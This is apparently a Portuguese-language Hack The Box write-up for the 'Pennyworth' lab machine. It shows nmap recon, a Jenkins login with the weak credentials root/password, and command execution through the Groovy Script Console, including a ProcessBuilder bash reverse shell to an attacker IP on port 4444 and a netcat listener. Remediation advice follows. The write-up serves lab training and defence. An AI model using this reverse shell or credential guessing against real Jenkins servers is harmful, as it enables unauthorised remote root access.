# Report — Máquina: Pennyworth — 10.129.7.209

- **Fonte:** Hack The Box
    
- **Data:** 2025-12-17
    
- **Autor:** Enrico Moreno
    
- **Nível:** super easy

---

## Executive Summary

O host expõe um Jenkins acessível via HTTP na porta 8080. A autenticação foi comprometida através de credenciais fracas, permitindo acesso ao Script Console e execução remota de comandos como **root**, resultando na obtenção da flag.

---

## Planning & Scoping

- **Alvo:** 10.129.7.209
    
- **Serviços em escopo:** HTTP (8080)
    
- **Ferramentas:** nmap, navegador, netcat
    
- **Limitações:** sem brute force automatizado, apenas testes manuais
    

---

## Discovery / Recon

### Nmap

```bash
sudo nmap -sS -T4 -p- -sV -O --min-rate 5000 10.129.7.209
```

**Resultado relevante:**

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
```

- Sistema operacional: Linux (kernel 4.x–5.x)
    
- Distância de rede: 2 hops

**Arquivo:**

![](Nmap_Pennyworth.txt)

---

## Enumeration & Analysis

Acessando o serviço HTTP na porta 8080, foi identificado:

- **Jenkins versão 2.289.1** rodando sobre Jetty
    
- Endpoint `/script` protegido por autenticação
    

Foram testadas manualmente combinações simples de credenciais (password spraying mínimo), resultando em autenticação bem-sucedida.

**Credenciais válidas:**

- Username: `root`
    
- Password: `password`
    

---

## Attack / Exploitation

### Validação de RCE

No Jenkins Script Console (`/script`), foi executado um comando simples para validar execução remota:

```groovy
String cmd = "whoami"
println cmd.execute().text
```

**Resultado:**

```
root
```

Confirmando execução de comandos com privilégios elevados.

---

### Reverse Shell

Foi iniciado um listener na máquina atacante:

```bash
nc -lvnp 4444
```

Em seguida, utilizou-se `ProcessBuilder` para contornar limitações de `Runtime.exec()` com shells interativos:

```groovy
def pb = new ProcessBuilder("/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.194/4444 0>&1")
pb.redirectErrorStream(true)
pb.start()
```

A conexão reversa foi estabelecida com sucesso, fornecendo shell como **root**.

---

## Post-Exploitation

Com acesso root, foi possível navegar livremente pelo sistema e localizar a flag.

```bash
cat /root/root.txt
```

---

## Impact & Root Access

- **Impacto:** Execução remota de comandos autenticada como root
    
- **Causa raiz:** Uso de credenciais fracas no Jenkins
    
- **CVE:** Não aplicável (misconfiguration)
    

---

## Remediation Recommendations

- Remover credenciais fracas e aplicar política de senhas fortes
    
- Restringir acesso ao Jenkins por IP/VPN
    
- Desabilitar ou restringir o Script Console
    
- Executar Jenkins com usuário sem privilégios
    

---

## Lessons Learned

- Jenkins exposto com autenticação fraca leva diretamente a RCE
    
- Reverse shells em Jenkins exigem controle explícito de streams (`ProcessBuilder`)
    
- Nem toda exploração envolve CVE; misconfigurações são vetores críticos
    

---

## Summary

A máquina Pennyworth demonstra um cenário clássico de **credenciais fracas em Jenkins**, levando a **RCE como root** via Script Console, sem necessidade de exploração baseada em CVE.
